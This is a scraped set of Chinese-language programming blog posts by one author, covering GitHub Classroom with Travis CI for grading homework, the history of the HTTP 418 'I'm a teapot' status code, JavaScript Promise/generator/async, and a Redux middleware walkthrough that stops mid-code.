每天我都會要求學生在 slack 群組裡面 po 昨天跟今天做的事情，雖然跟實際的 Stand-up meeting 還是相差許多，但至少初衷是一樣的：「幫自己整理進度、讓大家了解你的進度」。 秉持著相同的理念，這次的交作業機制我決定採用 Github Flow。 什麼是 Github Flow？可以先看一下我在官網上面截的圖： 簡單來說就是如果你要做任何改變的話，你要 follow 以下原則： 開新的 Branch 送 Pull Request 等 Review 確定沒問題，merge 到 master 我們公司也是採用類似的工作流程，因此我自己本身對這個流程滿熟悉的。而這個流程的好處是什麼？就是在送 PR 的時候，你可以很方便地看到改動以及加上建議： 這樣的方式，豈不是最適合拿來改作業？直接加上註解，可以一行一行修正，合格的作業就直接 approve，不合格的要求修正，然後再送一次 review。 決定好採用 PR 的方式交作業以後，其實還有一個東西要決定，那就是要怎麼送 PR？意思是說，PR 要在哪一個 repo 底下開？大概有以下幾種做法： 老師開一個 hw repo，開權限給所有學生，學生寫完作業以後對 hw 送 PR 學生開一個 hw-student repo，把老師加成協作者，寫完作業送 PR 讓老師 review 前者的話，你必須要在hw底下開不同資料夾，這樣每個學生才有地方來放自己寫的作業。好處很明顯，就是都集中在同一個地方進行管理，但缺點就是這個 repo 會變得很大，因為你可能同時要放 10 個學生寫的作業。 後者的話，學生自己開 repo，然後把老師加進來讓老師能 review，比第一種分散，但是自由度高很多，而且結業以後，學生可以直接把他的 repo 當成作品集的一部分。這兩種比起來，我是比較偏好這個的。 除此之外，其實還有另外一個問題需要解決，那就是有時候作業有固定格式需要遵守，例如說我有一些簡答題，已經在hw下面開好回答的模板，學生只要照著格式寫答案就好，那學生就必須複製這個模板到自己的 repo 底下，其實也是滿麻煩的。 那更好的方式是什麼？ 很簡單，就是結合了前面兩種： 老師開一個放作業模板的 repo，學生 fork 這個 repo 到自己帳號底下，並且利用這個 fork 的 repo 交作業 這樣子學生就不用從零開始，可以直接採用老師已經寫好的交作業模板跟格式，只要照著做就行了。而這種處理方式，其實就是我們等等會提到的 Github Classroom。 Github Classroom 我一開始看到這個，還以為是什麼神奇的系統，可以自動幫你完成一堆跟改作業有關的事情。但很可惜，這並不是。 Github Classroom 的系統很簡單，首先你要先註冊一個 organization 才能使用。進去之後你可以建立一個 Classroom，就是一堂課的意思。 而每堂課底下，都有一個地方可以讓你新增作業，在新增作業時你可以關聯自己帳號底下的 repo，介面長這樣： 而這個被關聯的 repo，就是你要拿來出作業的 repo，所以你可以先把很多東西都寫好，例如說交作業的規則跟格式之類的。像我的話就是會先把檔案開好，學生只要在指定的檔案下面寫答案就好： 在新增作業之後，會有一個自動產生的 invitation link，只要學生點擊並且加入之後，就會自動在你的 organization 底下產生新的 repo。 例如說我拿來關聯的 repo 叫做mentor-program，學生的帳號是 abcd，就會產生一個 mentor-program-abcd，而這個 repo 就是基於你原本的所產生的，所以東西都一模一樣。產生之後呢，他會自動把學生本人跟老師設為協作者，然後學生只有 developer 的權限，老師則是有 admin 的權限。 所以說呢，用了 Github Classroom 的好處就是有一個自動化的系統幫你 fork 一份你的 repo 給學生，然後自動設定權限，並且在後台可以看到每個學生的 repo： 做到這裡，你就有一個很不錯的改作業系統了，流程非常簡單： 學生透過 Github Classroom 產生的連結加入 產生 mentor-progam-student_username 的 repo 學生 clone 下來，開新的 branch，寫作業 寫完作業送 PR 老師 review，確認沒問題再 merge 結合 CI 自動改作業 剛剛有說過，你學生的 repo 都是以你提供的為基礎 fork 出去的，所以學生可以按照你訂的規則來寫作業。 舉我剛剛提到的例子，我就先幫學生開好hw1.js、hw2.js…他們直接在檔案裡面寫答案就好。如果你有注意到的話，我還幫他們開了hw1.test.js，拿來做 unit test 用的。 在第一週的作業裡面，他們被要求實作出幾個簡單的 function，例如說判斷質數、判斷回文等等。所以每個 js 裡面就只是 export 出一個 function 而已。那要怎麼驗證呢？跑測試！ 既然是那麼簡單的一些 function，那就可以寫 unit test 來驗證結果是否正確，而這個時候，我就想到其實可以結合 CI 做出自動改作業系統。 流程很簡單： 學生送 PR 串上 CI，偵測到有 PR 自動跑 test 在 PR 裡面顯示結果 完成後的結果會像這樣，可以直接在 PR 裡面看到 CI 跑測試之後的結果： 我採用的系統是有名的Travis CI，其實應用上也很簡單，登入進去之後它會自動抓你的 repo，就可以看到一個列表，只要打勾就可以把 Travis 跟 Github 串起來： 不過在打勾之前，你要對你的 repo 做一些設定。其實 CI 的原理很簡單，就是你提供一些指令讓它幫你跑，以我的課程來說，就是跑npm run test而已。 只要在專案的根目錄底下新增.travis.yml，就可以指定你要跑的環境跟其他參數，以我的專案為例： 12345678language: node_jsnode_js: - \"node\"cache: yarnbefore_script: - wget $TESTCASE_URLnotifications: email: false Travis 很聰明，所以預設就會執行npm run test，所以不必在這邊設定任何東西。可以注意到的是，我這邊額外設定了before_script，而後面接的參數就是你要執行的指令。 會這樣設定是因為我希望在 repo 裡面的 test 檔案可以讓學生自己練習，他們自由修改，而我真正拿來改作業的 test 我把它放在遠端了，在跑 CI 的時候才抓下來，確保學生不可能改到。 準備完成以後，你只要去 CI 的後台打勾，並且進去調一些設定（例如說只要幫 PR 跑測試、環境變數的調整等等），一切就大功告成了！ 結論 結合了 Github Classroom 跟 Travis CI，就能夠很輕鬆的打造出一個方便讓學生交作業，也讓老師可以很輕鬆的批改作業，甚至是讓系統自動改作業的服務。 如果你想要更進一步，CI 那端還有很多延伸應用可以做，例如說跑測試失敗的話就自動把 PR 關掉，或者是自動回覆說哪一個作業是錯誤的，甚至也可以把這些訊息記起來，直接做一個學生的 scoreboard 之類的，有很多有趣的應用可以玩。 但若是你只是想要基本的東西，只要簡單設定一下就夠了。 這一篇整理了我最近課程的改作業流程，目前嘗試起來都覺得很不錯，一來是我可以方便改作業，二來是強迫學生熟悉 Git 的流程，而且他們會越來越熟練。 如果你有哪些更好的建議，歡迎在下面留言，文中如果有錯也麻煩不吝指出，感謝。","link":"/2018/02/03/github-classroom-and-travis-ci/"},{"title":"搶救茶壺大作戰：418 I am a teapot","text":"前言 有許多的 HTTP Status Code 大家都耳熟能詳，例如說 404 Not Found、500 Internal Server Error 以及 200 OK 等等。 在眾多的狀態碼之中，有一個擺明就是來搞笑的：418 I’m a teapot。 但你知道嗎，它不在 HTTP 標準裡面，所以根本不是標準的 HTTP 狀態碼。你可能會想說：「我都看過 RFC 了，怎麼會不是？」。但那份 RFC 也跟 HTTP 一點關係都沒有，不過滿多人都沒注意到這點。 我一開始也沒注意到這件事，以為 418 是 HTTP 標準的其中一部分，一直到 2017 年 8 月時有人在 Node.js 的 GitHub 發了一個 Issue：418 I’m A Teapot 我才注意到。 Issue 裡面提到希望能移除對 418 的 support，而發起 Issue 的作者在被人告知 Go 也這樣搞的時候，也跑去 Go 發了一個 Issue。 那時候這起要求移除 418 狀態碼的事件其實引發了不小的風波，而大部分人其實是反對移除這個狀態碼的。甚至還有人做了一個 save418.com，想要拯救 418。 前陣子花了點時間研究一下整件事情的來龍去脈，在整理的過程中也發現無論贊成或是反對，這其中的理由都很值得我們去思考，因此在此總結成一篇文章跟大家分享。 418 的由來 418 的由來可以追溯到 1998 年 4 月 1 日愚人節的這一份文件：RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP/1.0)，HTCPCP 是 Hyper Text Coffee Pot Control Protocol 的簡稱，總之這份 RFC 描述了一個叫做 HTCPCP 的協定，建立在 HTTP 之上，並且可以利用這個協定來泡咖啡。 講到 418 的部分在 Section 2.3.2： 2.3.2 418 I’m a teapot Any attempt to brew coffee with a teapot should result in the error code “418 I’m a teapot”. The resulting entity body MAY be short and stout. 大意就是如果有人想用茶壺來泡咖啡，你應該回個它一個 418 的狀態碼，我是個茶壺，你幹嘛拿我來泡咖啡？ 這邊值得注意的只有一件事，那就是 418 是在 HTCPCP 這個協定裡面，並不是 HTTP。所以 418 並不是 HTTP 協定的標準狀態碼。 移除 418 的風波 在 2017 年 8 月 5 日，Mark Nottingham 在 Node.js 的 GitHub 發了這樣的一個 Issue： Node implements the 418 I’m a Teapot status code in a few places. Its source is RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP/1.0). Note the title - HTCPCP/1.0 is not HTTP/1.x. HTCPCP was an April 1 joke by Larry to illustrate how people were abusing HTTP in various ways. Ironically, it’s not being used to abuse HTTP itself – people are implementing parts of HTCPCP in their HTTP stacks. In particular, Node’s support for the HTCPCP 418 I’m a Teapot status code has been used as an argument in the HTTP Working Group to preclude use of 418 in HTTP for real-world purposes. While we have a number of spare 4xx HTTP status codes that are unregistered now, the semantics of HTTP are something that (hopefully) are going to last for a long time, so one day we may need this code point. Please consider removing support for 418 from Node, since it’s not a HTTP status code (even by its own definition). I know it’s amusing, I know that a few people have knocked up implementations for fun, but it shouldn’t pollute the core protocol; folks can extend Node easily enough if they want to play with non-standard semantics. Thanks, 裡面請求 Node 把 418 的支援移除，理由是 418 並不是 HTTP 標準的狀態碼，而且 4xx 的狀態碼雖然還有很多，但若是我們希望 HTTP 能盡量活得長久，我們終究有一天需要用到這個狀態碼的。 底下引起了一番討論之後，有人指出 Go 也實作了 418，因此 Mark Nottingham 就跑到了 Go 的 GitHub 去，也發了一個相似的 Issue：net/http: remove support for status code 418 I’m a Teapot。 這兩個 Issue 其實都很值得一看，裡面有許多很有建設性的討論。下面我整理幾個支持與反對的論點。 反對移除：418 是無害的 418 是個無害的彩蛋，而且很有趣，離我家的 418 遠一點！ 我覺得這論點滿無力的，只要證明 418 其實是有害的就好。 支持移除：萬一以後有人要用 418 怎麼辦？ 你說 418 無害，不對啊，如果我們希望 HTTP 能活得久，那遲早會有 418 會需要被用到的一天，到那天他就是別的意思了。就算你把 418 保留起來，也是少了一個狀態碼可以用 這一點我覺得滿有趣的。的確，照這種說法 418 佔了一個位置，以後能用的狀態碼就少了一個。但問題是這「一個」重要嗎？可以搭配下面的反對論點一起看。 反對移除：418 只佔了一個空間，問題不在 418 如果 4xx 都快用完的那天真的來臨了，該檢討的是 HTTP 的設計，還是檢討狀態碼不夠用？如果真的只剩一個可以用，是不是代表還有更大的問題該解決？ 之所以這點我覺得很有趣，是因為這跟我們平時在寫程式會碰到的問題滿像的。有時候你會擔心自己是不是過早最佳化（Premature Optimization）或是過度工程化（Over Engineering），做了完全不需要用到的優化。 假設今天有一個程式，用 1~100 這 100 個數字來表示不同狀態。隨著時間我們會需要不同的數字來表示不同狀態，所以能用的數字會愈來愈少，而我們又希望這程式能夠活得長久。在這種情況下，你贊成我們拿其中一個數字來當彩蛋嗎？ 如果你反對，認為每一個數字都很重要，不該隨意拿一個數字出來當彩蛋，就代表你認為 418 是該被移除的。 但我自己對這題的看法是一個數字根本無關緊要。 理由是，若是你真的把 99 個數字用完了，就算我拿去當彩蛋的數字還你，你依然在不久後會用完所有的數字。到那個時候，你還是需要找新的解法。所以只差一個數字根本差不了多少。 支持移除：418 不在 HTTP 標準內 這是我覺得最有力的論點。 大家都知道 418 是個彩蛋，也知道它很有趣，可是它終究不是 HTTP 標準的一部分。今天你如果要實作一個「遵循 HTTP 標準」的程式，你就不應該把 418 放進去，因為它不在裡面。在 IANA 裡面 418 也是 Unassigned 的狀態。 如果你今天是市井小民，想要在自己家的伺服器或是 App 裡面實作 418，那沒有人會干擾你。但對於 Node.js、Go 這種專案來說，就應該遵守規範來開發。 這點也可以延伸到平常開發產品時會碰到的問題。如果 PM 規格寫不清楚，工程師要嘛自己通靈，要嘛就叫 PM 把模糊的地方寫清楚一點，最好是不要有任何個人的解釋空間，越清楚越好。 當今天 PM 把規格書寫得超級清楚，工程師卻自己偷偷加了一個額外的彩蛋，這是合理的嗎？這彩蛋可能無關緊要，可能只有工程師自己知道怎麼打開，但無論如何還是超出了規格之外。 在思考 418 的去留問題時，你可能只看見 418。但我認為你在碰到 418 問題時所做出的選擇，都跟你平時開發會碰到的問題有關。而且有趣的是，你有可能在 418 時選了 A，卻在類似的開發問題上選了 B，兩者是互相衝突的。 以我個人的立場來說，418 不在標準內這個理由很有力。不過以情感上來說我是不希望它被移除的，幸好還有一個反對的論點也滿有力的。 反對移除：418 已經被誤用太久了 在做版本更新時，有一個很重要的點是要維持向下相容（backward compatible），如果不是什麼太重要的事，盡量不要有 breaking change。 而這個論點講的是 418 作為一個「被誤認為是 HTTP 標準」的狀態碼已經十幾年了，所以每一個主流的函式庫幾乎都有支援 418（你看 Node.js 跟 Go 都有支援），若是今天把 418 的支援拔掉了，那以前使用到 418 的 Server 怎麼辦？ 這論點我也覺得滿有力的，418 已經被誤用太久，拔掉之後會產生的問題似乎比維持現狀還要多。從這點來看，它是不該被移除的。 418 的後續發展及現況 當初 Mark Nottingham 發表了希望移除 418 的 Issue 之後，有些人覺得他是來鬧的，吃飽太閒才會把想法動到 418 身上去。 但如果你點進他的 GitHub，可以看到他的自我介紹： I work on HTTP specifications and implementations. 他原本就參與了各個跟 HTTP 標準相關的組織，而且在這個領域做了不少的貢獻。 在社群掀起了反對聲浪以後，他也決定從原本的移除 418 轉變為保留 418 的立場： So, I poked a couple of implementations to see if they’d remove 418’s “teapot” semantics, and there was a reaction (to put it mildly). I think we need to reserve 418 to make it clear it can’t be used for the foreseeable future （來源：http-wg 的 mailing list: Reserving 418） 於是起草了一份文件：Reserving the 418 HTTP Status Code，裡面說明要把 418 的狀態設定為保留，不能被其他人註冊走： [RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of the application-specific 418 (I’m a Teapot) status code. In the intervening years, this status code has been widely implemented as an “easter egg”, and therefore is effectively consumed by this use. This document changes 418 to the status of “Reserved” in the IANA HTTP Status Code registry to reflect that. 當初研究這整件事情到這裡時，看到這份草稿的資訊發現已經過期了（Expires: February 12, 2018），到 IANA HTTP Status Code registry 看，發現 418 一樣是 Unassigned。 線索就到這邊全部斷掉了，所以 418 最後到底怎麼樣了？會變成保留中嗎？ 於是我寫了封信去問 Mark Nottingham 本人，他只丟給我一個連結：https://github.com/httpwg/http-core/issues/43。 從這個 Issue 可以找到這個 PR：Reserve 418 status code，裡面更動了draft-ietf-httpbis-semantics-latest.xml這個檔案。而在 httpwg 的網站上也可以找到現在最新的草稿：https://httpwg.org/http-core/draft-ietf-httpbis-semantics-latest.html。 在最新的草稿裡面，多了這段： 9.5.19. 418 (Unused) [RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of an application-specific 418 status code. In the intervening years, this status code has been widely implemented as an “Easter Egg”, and therefore is effectively consumed by this use. Therefore, the 418 status code is reserved in the IANA HTTP Status Code registry. This indicates that the status code cannot be assigned to other applications currently. If future circumstances require its use (e.g., exhaustion of 4NN status codes), it can be re-assigned to another use. 看起來是把 418 先保留起來，但如果日後 4XX 的狀態碼真的用完，還是可以把 418 拿去做其他的用途。 而 httpwg 的網站上也能找到目前最新的 HTTP/1.1 的標準：Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content，裡面是沒有 418 的。 因此我自己的猜測是在最新的草稿裡面已經把 418 放進去了並且設成保留，但是還沒有正式發表（背後應該還有一堆流程，這部分要去研究 HTTP Working Group 的規章才能知道），不過在日後應該可以看見草稿發布並成為正式的標準。 總結 這樣看下來，418 I am a teapot 依舊不會是 HTTP 的標準。畢竟應該有些人跟我想的一樣，只要把 418 I am a teapot 變成 HTTP 標準的一部分，問題就解決了，但最後沒有這樣做我猜是會碰到一些問題（至於是什麼問題我也不知道，有人知道的話麻煩提點，感謝）。 最後的結論應該是 418 這個狀態碼依然會繼續以 I am a teapot 存在於各個主流的 HTTP 實作裡面，但依舊不是 HTTP 標準的一部分。在標準裡面 418 狀態碼是被設定為 (Unused) 而且暫時被保留著，不會被其他用途給取代。 這篇的目的主要就是想記錄一下 418 狀態碼的過去以及現在，並且讓大家知道它並不是 HTTP 標準的一部分。除此之外，在研究的過程中也聯想到了許多開發上會碰到的問題，其實背後的核心概念都是差不多的。 其實在寫這篇的時候猶豫了許久，因為很怕自己有地方會寫錯（參考資料太多太豐富），不過想起了之前忘記在哪看到的一句話：「比起提問，有個更快能得到正確答案的方法。那就是講一個錯的答案，就會有人來糾正你了」。 延伸閱讀： HN 的討論 HN 的討論 - 2","link":"/2019/06/14/http-status-code-418-teapot/"},{"title":"[Javascript] Promise, generator, async與ES6","text":"在Javascript裡面，有一個超級重要的概念就是非同步，這也是剛入門的時候最容易搞混、忘記的觀念 ES6原生支援了Promise，搭配Generator使用效果更佳，而ES7甚至支援了async的語法 我覺得這算是一個演進的過程，讓程式架構越來越好、可讀性越來越高 所以要講解這些新的東西，就先從最基本的callback開始吧 現在假設我們有三個api 第一個是抓取文章列表的api 1234567891011121314[ &#123; \"title\": \"文章1\", \"id\": 1 &#125;, &#123; \"title\": \"文章2\", \"id\": 2 &#125;, &#123; \"title\": \"文章3\", \"id\": 3 &#125;] 第二個是給文章id, 抓取文章內容的api 12345&#123; \"authorId\": 5, \"content\": \"content\", \"timestamp\": \"2015-08-26\"&#125; 第三個是給作者id, 返回作者資訊的api 12345&#123; \"email\": \"aszx87410@gmail.com\", \"name\": \"huli\", \"id\": 5&#125; 現在想要達成的功能是：抓取最新的一篇文章的作者信箱 流程就是：抓文章列表-&gt;抓文章資訊-&gt;抓作者 實作成code就像這樣 12345678910111213141516171819202122232425262728293031getArticleList(function(articles)&#123; getArticle(articles[0].id, function(article)&#123; getAuthor(article.authorId, function(author)&#123; alert(author.email); &#125;) &#125;)&#125;)function getAuthor(id, callback)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/E105pDLh\",&#123; author: id &#125;).done(function(result)&#123; callback(result); &#125;)&#125;function getArticle(id, callback)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/EkI02vUn\",&#123; id: id &#125;).done(function(result)&#123; callback(result); &#125;)&#125;function getArticleList(callback)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; callback(result); &#125;);&#125; 或可參考線上範例：用callback實做 相信這樣子的code大家應該都不陌生，但是這樣會有一個缺點 就是我們俗稱的callback hell，這樣一層一層一層的實在是有點醜 那該怎麼辦呢？有種東西叫做Promise，就這樣出現了 先來個實際範例再來講解吧！ 12345678910111213141516171819202122232425262728293031323334353637getArticleList().then(function(articles)&#123; return getArticle(articles[0].id);&#125;).then(function(article)&#123; return getAuthor(article.authorId);&#125;).then(function(author)&#123; alert(author.email);&#125;);function getAuthor(id)&#123; return new Promise(function(resolve, reject)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/E105pDLh\",&#123; author: id &#125;).done(function(result)&#123; resolve(result); &#125;) &#125;);&#125;function getArticle(id)&#123; return new Promise(function(resolve, reject)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/EkI02vUn\",&#123; id: id &#125;).done(function(result)&#123; resolve(result); &#125;) &#125;);&#125;function getArticleList()&#123; return new Promise(function(resolve, reject)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; resolve(result); &#125;); &#125;);&#125; 線上範例：用Promise實做 Promise是一個物件，有三種狀態，等待中（pending）、完成（resolve or fulfilled）跟失敗（reject） 在上面的範例中，我們把那三個函數的callback function拿掉了，取而代之的是返回一個Promise物件 原本應該是callback要出現的地方，變成了resolve 這樣有什麼好處呢？看我們最上面呼叫這些函式的地方，原本的callback hell不見了，被我們壓平了 如果看的不是很懂，就先從最基本的，呼叫一個Promise開始 12345678910111213getArticleList().then(function(articles)&#123; console.log(articles);&#125;);function getArticleList()&#123; return new Promise(function(resolve, reject)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; resolve(result); &#125;); &#125;);&#125; 你可以在Promise物件後面加上.then，就會是這個Promise跑完之後的結果 假如在then裡面return另一個Promise物件，就可以不斷串接使用 像是這樣 12345getArticleList().then(function(articles)&#123; return getArticle(articles[0].id);&#125;).then(function(article)&#123; return getAuthor(article);&#125;); 有了Promise的這個特性，就可以避免掉callback hell 如果我們加上ES6的arrow function，甚至可以簡化成這樣 123456getArticleList().then(articles =&gt; getArticle(articles[0].id)).then(article =&gt; getAuthor(article.authorId)).then(author =&gt; &#123; alert(author.email);&#125;); 線上範例 Promise+arrow function 單純運用Promise的範例就到這邊為止，其實到這邊語法已經滿簡單的了，而且有了arrow function以後，可讀性有變得比較好，但是看到一堆then總是覺得有點礙眼 那接下來還有什麼呢？ ES6裡面多了一個Generator，如果不知道的話可參考我的上一篇文章[Javascript] ES6 Generator基礎 接著就要利用Generator的特性，來寫出超級像同步但其實是非同步的程式碼 12345678910111213141516function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125;var gen = run();gen.next().value.then(function(r1)&#123; gen.next(r1).value.then(function(r2)&#123; gen.next(r2).value.then(function(r3)&#123; gen.next(r3); console.log(\"done\"); &#125;) &#125;)&#125;); 完整版線上範例 Promise + Generator 仔細看run這個generator，利用yield的特性，會先執行右邊的程式碼，等待下一次的呼叫並且賦值給左邊 所以我們可以在getArticleList()裡面的then事件呼叫gen.next(r1)，就會把回傳值丟給articles這個變數 如果覺得這樣有點難懂，可以先換成只有一層的 1234567891011121314function* run()&#123; var articles = yield getArticleList(); console.log(articles); &#125;var gen = run();//第一次呼叫，會執行到getArticleList()，會回傳一個Promisegen.next().value.then(function(r1)&#123; //第一個Promise結束後，把r1丟回給generator，讓articles = getArticleList()的回傳值 gen.next(r1); console.log('done');&#125;); 讓我們再回來看看上面那段程式碼的上半部 123456function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; 有沒有覺得，跟同步的程式碼很像？只要把yield拿掉的話，根本就一模一樣對吧！ 這就是generator的精髓所在了：用很像同步的語法，但其實是非同步 那再來看看下半部 123456789var gen = run();gen.next().value.then(function(r1)&#123; gen.next(r1).value.then(function(r2)&#123; gen.next(r2).value.then(function(r3)&#123; gen.next(r3); console.log(\"done\"); &#125;) &#125;)&#125;); 很容易可以發現下半部的語法很固定，並且容易找出規律 而且根本就是個遞迴 所以可以用一個函式包住，處理更多general的case 123456789101112131415161718192021function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125;function runGenerator()&#123; var gen = run(); function go(result)&#123; if(result.done) return; result.value.then(function(r)&#123; go(gen.next(r)); &#125;); &#125; go(gen.next());&#125;runGenerator(); 完整版線上範例 Promise + Generator + 遞迴 tj做的co模組就是在做差不多的事情，只是做得更多了 但原理跟我們上面寫的runGenerator很類似，就是把一個generator包起來寫一個自動執行器 最後，終於要講到標題上的最後一個東西了：async 這是什麼？先來看code 123456async function run()&#123; var articles = await getArticleList(); var article = await getArticle(articles[0].id); var author = await getAuthor(article.authorId); alert(author.email); &#125; 完整版線上範例 async(沒辦法跑) (jsfiddle支援度沒那麼高，所以沒辦法跑這段code) 這段code跟之前的差別在於 function* gen()變成async function run() yield變成await 就這兩個點而已 然後你會發現，就這樣就結束了 不必用其他模組，不必自己寫遞迴執行器 這就是async的語法，其實就是把那些自動執行寫好而已，但是這樣的語法讓我們方便許多 而其實這個語法是在ES7才有計畫引入的，QQ 好消息是，我們上面有關ES6的code都是通過babel這個library轉換成ES5的語法 而他有個實驗性功能的地方，其中就有包含async 而async是在stage 2，NOTE: Stage 2 and above are enabled by default. 什麼參數都不用調整就自動幫你開啟了，真是可喜可賀 當初剛接觸ES6時，一下子接觸到一堆眼花撩亂的東西，每個再繼續深入下去都是一門學問 而且我在之前都是純粹用callback（因為層級不多所以還好），偶爾用一下async（node的library，跟上面的不一樣） 所以我覺得最好了解的方式，就是從最基礎的callback開始，慢慢進步到promise，再進步到generator，最後才是async 才能懂得為什麼會有這些東西的出現 如果有哪些地方有講錯，還麻煩留個言或是寄信給我 感謝 ref: ECMAScript 6 入门 异步操作 JavaScript Promises 拥抱Generator，告别异步回调 深入浅出ES6（三）：生成器 Generators","link":"/2015/08/26/javascript-promise-generator-async-es6/"},{"title":"[Javascript] redux 的 middleware 詳解","text":"之前寫了一篇文章簡單的筆記一下自己在看redux的心得，在這邊還是要再次推薦官方文件，因為寫的超級清楚。 但是之前在看官方文件的時候，middleware的地方沒有完全看懂，看到後面就霧煞煞了 這次重看了一遍官方文件講middleware跟非同步操作的地方，邊看邊做筆記，總算是把middleware的實作原理弄懂了 依照慣例分享一下心得 官方文件（中譯版，但是還沒翻譯到這篇） 官方文件很棒的點就是這篇不只教你怎麼用，還從頭講起，讓你知道為什麼middleware會是現在這樣的形式。 #正文 你在看了某些教學文章之後覺得redux實在是太棒了，於是開始採用redux做自己的產品 可是此時此刻你突然想要做一個功能：logging，你想記錄每個action，以及執行action完以後store的改變 該怎麼做呢？先從最簡單的方法開始吧！ ##第一次嘗試：最直覺的方法 假設我們原本dispatch action的code是這樣寫 1store.dispatch(addTodo('Use Redux')); 我們可以直接改成 12345let action = addTodo('Use Redux');console.log('dispatching', action);store.dispatch(action);console.log('next state', store.getState()); ##第二次嘗試：包成函式 但是第一種方法大家都知道不能這樣，因為程式裡面一定不只一個地方需要做這件事情 那接下來怎麼辦呢？把它包成函式吧 123456function dispatchAndLog(store, action) &#123; console.log('dispatching', action); store.dispatch(action); console.log('next state', store.getState());&#125;dispatchAndLog(store, addTodo('Use Redux')); 可是這樣子，你每個需要dispatch的地方都要import這個函式，有沒有更好的作法呢？ ##第三次嘗試：Monkeypatching 什麼是Monkeypatch？大家可以自己估狗一下 大意就是：在runtime的時候把某個東西換掉 就像是你可以在你的chrome devtool裡面寫 123console.log = function(text)&#123; alert(text);&#125; 這樣子原本會在console裡面出現的訊息，就會全部用alert顯示了 那用在這裡我們要怎麼用呢？ 123456789101112131415//先把原本的存起來，因為之後會用到let next = store.dispatch;//覆蓋掉現在的store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); //執行 next(action); console.log('next state', store.getState()); return;&#125;;//呼叫方式跟之前一樣store.dispatch(addTodo('Use Redux')); 這樣子的話，原本的code完全不用更動，你只要在程式剛開始的地方把store.dispatch換掉就好了 實在是輕鬆又愉快，但是我們很快就碰到了一個新的問題 如果我現在想要一個錯誤回報的機制怎麼辦？當dispatch出錯的時候，我想把錯誤傳回server 嗯…好問題 我們可以把這兩個想做的事情獨立成兩個function，差不多像是這樣 123456789101112131415161718192021222324252627282930function patchStoreToAddLogging(store) &#123; let next = store.dispatch; store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); next(action); console.log('next state', store.getState()); return; &#125;;&#125;function patchStoreToAddCrashReporting(store) &#123; let next = store.dispatch; store.dispatch = function dispatchAndReportErrors(action) &#123; try &#123; next(action); &#125; catch (err) &#123; console.error('Caught an exception!', err); Raven.captureException(err, &#123; extra: &#123; action, state: store.getState() &#125; &#125;); throw err; &#125; &#125;;&#125;patchStoreToAddLogging(store);patchStoreToAddCrashReporting(store); 剛開始讀到這段的時候我就有點暈了，不太懂為什麼這樣子可以 後面的不是會把前面的store.dispatch覆蓋掉嗎？後來再看幾次終於看懂，精髓就在於那個let next = store.dispatch; 上面code的行為大概會是這樣： 執行第一個函式patchStoreToAddLogging(store); 現在的dispatch（redux真正發送action的函式）被保存起來 store.dispatch被換掉，換成dispatchAndLog這個函式，這個函式的行為會是：做紀錄並且呼叫原本的dispatch 執行第二個函式patchStoreToAddCrashReporting(store); 現在的dispatch（注意，已經變成dispatchAndLog這個函式了）被保存起來 store.dispatch被換掉，換成dispatchAndReportErrors這個函式，這個函式的行為會是：做紀錄並且呼叫原本的dispatc 好，接著若是我們呼叫dispatch(..)，看一下流程會怎麼走 因為剛剛被換掉，所以執行dispatchAndReportErrors 執行next(action)，而next就是之前保存的dispatch，就是dispatchAndLog 執行dispatchAndLog 做紀錄，然後執行next(action)，而next就是之前保存的dispatch，就是最原始的dispatch 執行最原始的dispatch，執行完畢以後跳回dispatchAndLog這個function 回到dispatchAndLog，印出改變後的state 回到patchStoreToAddCrashReporting，因為都沒有錯誤，所以不做任何事 結束 這樣子就達成我們middleware最重要的功能，可以讓action經過一層又一層的中間件，最後抵達store 但是這樣子還是不夠好 ##第四次嘗試：把Monkeypatching藏起來 之前我們都是直接把store.dispatch換掉，那如果我們不要直接換掉，而是傳回一個function，會發生什麼事？ 12345678910111213function logger(store) &#123; let next = store.dispatch; // 之前的: // store.dispatch = function dispatchAndLog(action) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;;&#125; 假設我們的crashReporter也改成這種形式，那我們就可以 12store.dispatcher = logger(store);store.dispatcher = crashReporter(store); 其實只是把store.dispatcher抽出來，獨立在function外面而已 但這樣做的好處就是，我們可以這樣 1234567function applyMiddlewareByMonkeypatching(store, middlewares) // Transform dispatch function with each middleware. middlewares.forEach(middleware =&gt; store.dispatch = middleware(store) );&#125;applyMiddlewareByMonkeypatching(store, [logger, crashReporter]); 但是這樣子其實只是把monkeypatch的地方抽出來而已，實際上還是在 下一步，我們要把monkeypatch這個方法徹底移除掉 ##第五次嘗試：把monkeypatching移除掉 為什麼我們要override dispatch？ 有一個很重要的因素就是，這樣才能不斷呼叫之前的dispatch 1234567891011function logger(store) &#123; // 這行超重要，有了這行才能達成chaining let next = store.dispatch; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;;&#125; 如果少了那重要的一行，那就無法達成chaining的效果 但其實除了這樣子寫，我們還有另外一個方法可以用 我們可以接收一個next的參數，達到相同目的 官方文件接著有點講太快了，咻咻咻就直接把最重要的一個部分講完 我這邊試著把進度放慢，講更多細節的東西，其實就是差在currying這個概念 繼續剛剛講的，我們可以接收一個next的參數，就會變成這樣 12345678function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', 